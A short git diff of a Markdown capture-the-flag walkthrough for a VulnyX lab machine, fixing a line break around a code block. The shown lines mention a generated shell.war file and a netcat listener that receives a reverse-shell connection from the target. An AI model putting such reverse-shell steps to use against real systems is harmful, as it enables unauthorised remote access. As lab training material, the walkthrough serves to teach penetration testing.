@@ -130,7 +130,8 @@ Final size of war file: 1093 bytes
 
 ![shell.war](/walkthroughs/vulnyx/low-difficulty/deploy/shell.png)
 
-```bash                                                                     ┌──(root㉿kali)-[/home/dungcngo]
+```bash                                                           
+┌──(root㉿kali)-[/home/dungcngo]
 └─# nc -lvnp 443
 listening on [any] 443 ...
 connect to [192.168.100.172] from (UNKNOWN) [192.168.100.150] 39748
